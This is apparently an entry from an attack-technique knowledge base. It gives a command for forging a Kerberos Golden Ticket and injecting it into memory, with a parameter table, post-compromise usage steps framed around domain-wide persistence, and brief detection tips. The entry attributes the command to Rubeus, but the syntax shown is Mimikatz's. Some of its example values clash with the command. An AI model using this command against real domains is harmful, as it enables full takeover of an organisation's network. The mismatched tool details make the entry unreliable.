---
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:07.242801+00:00'
updated_at: '2023-04-10T20:26:22.637180+00:00'
platforms:
  - Windows
tags:
  - golden-ticket
  - kerberos
  - privilege-escalation
validated: true
---

# rubeus-generate-golden-ticket

## Code

```powershell
kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
```

## Description

This Rubeus command generates a forged Kerberos Golden Ticket using the krbtgt NTLM hash and domain SID, optionally adding group SIDs for elevated privileges. The /ptt flag injects the ticket into the current session for immediate use in pass-the-ticket attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `/user:Administrator` | Username for the forged ticket | `krbtgt` |
| `/krbtgt:HASH_KRBTGT` | NTLM hash of krbtgt account | `31d6cfe0d16ae931b73c59d7e0c089c0` |
| `/domain:domain.local` | Target domain FQDN | `parent.domain.com` |
| `/sid:S-1-5-21-...` | Domain SID | `S-1-5-21-2941561648-383941485-1389968811` |
| `/sids:S-1-5-...` | Additional group SIDs (e.g., Domain Admins) | `S-1-5-21-xxx-xxx-xxx-512` |
| `/ptt` | Pass-the-ticket: Inject into memory | N/A |

## Usage

Compile or download Rubeus.exe, execute from an elevated command prompt on a compromised domain machine. Use after obtaining krbtgt hash via DCSync. The ticket grants indefinite admin access; test with resource access like SMB shares. Ideal for persistence post-SID hijacking.

## Detection

- Kerberos event logs (4769) for tickets with mismatched SIDs or infinite lifetimes.
- Process monitoring for Rubeus.exe execution (YARA signatures available).
- Anomalous TGT requests without AS-REQ.

## Related

- [[procedures/sid-hijacking-for-golden-ticket-attack]]
